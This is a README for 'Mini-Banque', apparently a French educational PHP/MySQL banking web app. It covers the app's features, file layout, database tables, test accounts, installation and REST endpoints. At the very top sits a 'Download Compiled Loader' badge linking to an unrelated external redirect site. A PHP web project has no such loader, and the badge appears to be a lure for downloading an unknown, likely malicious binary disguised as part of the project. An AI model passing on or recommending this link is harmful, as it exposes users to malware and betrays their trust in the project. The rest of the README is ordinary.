# 🏦 Mini-Banque

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

**Application de gestion bancaire web** — Projet pédagogique PHP / MySQL / JavaScript

> Version 3.0 — Architecture 3‑tiers avec API REST et persistance sécurisée des données.

---

## 📖 Présentation

Mini‑Banque est une application web client‑serveur qui simule les opérations bancaires de base :

- **Authentification** sécurisée (sessions PHP, mots de passe hashés avec bcrypt)
- **Consultation du solde** en temps réel
- **Dépôts** et **retraits** avec vérification de solde et limite journalière
- **Virements** entre utilisateurs (par email), avec historique distinct
- **Historique complet** des transactions (dépôts, retraits, virements émis/reçus)
- **Profil utilisateur** (modification du nom, changement de mot de passe)

Toutes les données sont stockées dans une base de données MySQL et manipulées via une API REST en PHP.

---

## 🧱 Technologies

| Couche        | Technologie               |
|---------------|---------------------------|
| Frontend      | HTML5, CSS3, JavaScript (Vanilla) |
| Backend       | PHP 8+ (API REST)         |
| Base de données | MySQL (PDO, requêtes préparées) |
| Authentification | Sessions PHP + bcrypt   |
| Communication | AJAX (`fetch`)            |

---

## 📁 Structure du projet
mini-banque/
├── api/ # Endpoints PHP (backend)
│ ├── connexion.php
│ ├── inscription.php
│ ├── depot.php
│ ├── retrait.php
│ ├── virement.php
│ ├── solde.php
│ ├── historique.php
│ ├── profil.php
│ └── limite_retrait.php
├── config/
│ └── db.php # Paramètres de connexion MySQL (à ignorer par Git)
├── Frontend/ # Pages de l'application
│ ├── index.php # Tableau de bord
│ ├── login.php # Connexion
│ ├── signup.php # Inscription
│ ├── profil.php # Profil utilisateur
│ ├── logout.php # Déconnexion
│ ├── style.css # Feuille de styles
│ └── script.js # Fonctions JavaScript utilitaires
├── genhash.php # Outil : génération de hash bcrypt
├── testdb.php # Outil : test de connexion MySQL
├── init_database.sql # Script de création de la base de données (schéma v3)
└── README.md



---

## 🗄️ Base de données

Le schéma contient trois tables :

- **`utilisateurs`** : identité et authentification
- **`comptes`** : solde, devise, numéro de compte
- **`transactions`** : historique des opérations (types : `depot`, `retrait`, `virement_envoye`, `virement_recu`)

Le script `init_database.sql` crée automatiquement la base `mini_banque` et les tables avec des données de test.

### Utilisateurs de test

| Email               | Mot de passe (clair) |
|---------------------|----------------------|
| ahmed@banque.tn     | `password123`        |
| sarra@banque.tn     | `password123`        |
| mohamed@banque.tn   | `password123`        |
| fatma@banque.tn     | `password123`        |
| ali@banque.tn       | `password123`        |

> ⚠️ Les mots de passe sont hachés dans la base. Utilisez `password123` pour vous connecter.

---

## 🚀 Installation

### Prérequis

- Serveur local (XAMPP, WAMP, Laragon…) avec **PHP ≥ 8.0** et **MySQL ≥ 5.7**
- Accès à phpMyAdmin ou à la ligne de commande MySQL

### Étapes

1. **Cloner le projet** dans le dossier `htdocs` (ou équivalent)
2. **Importer la base de données** :
   - Ouvrez phpMyAdmin
   - Exécutez le fichier `init_database.sql`
3. **Configurer la connexion PDO** :
   - Copiez `config/db.php.example` en `config/db.php`
   - Modifiez les identifiants MySQL si nécessaire
4. **Lancer l’application** dans votre navigateur :http://localhost/mini-banque/Frontend/login.php


---

## 🔐 Sécurité

- Mots de passe hachés avec `password_hash()` (bcrypt)
- Requêtes préparées PDO (protection contre les injections SQL)
- Transactions SQL avec verrouillage `SELECT ... FOR UPDATE` (intégrité des soldes)
- Régénération de l’ID de session après connexion
- Limite journalière de retraits / virements (1000 DT par défaut)

---

## 📮 API Endpoints (exemples)

| Méthode | Endpoint              | Description                | Auth requise |
|---------|-----------------------|----------------------------|--------------|
| POST    | `api/connexion.php`   | Authentification           | Non          |
| POST    | `api/inscription.php` | Création de compte         | Non          |
| GET     | `api/solde.php`       | Solde du compte connecté   | Oui          |
| POST    | `api/depot.php`       | Effectuer un dépôt         | Oui          |
| POST    | `api/retrait.php`     | Effectuer un retrait       | Oui          |
| POST    | `api/virement.php`    | Virement entre comptes     | Oui          |
| GET     | `api/historique.php`  | Historique des transactions| Oui          |
| GET/POST| `api/profil.php`      | Profil utilisateur         | Oui          |
| GET     | `api/limite_retrait.php`| État de la limite journalière | Oui       |

Toutes les réponses sont en **JSON**.

---

## 🧪 Fonctionnalités optionnelles

- Filtrage de l’historique par type et par date
- Jauge visuelle de la limite journalière
- Messages de succès / erreur avec animation
- Mode responsive (mobile, tablette, desktop)

---

## 👥 Contributeurs

Projet réalisé dans le cadre d’un apprentissage du développement web full‑stack.

---

## 📄 Licence

Ce projet est libre de droits pour un usage éducatif.
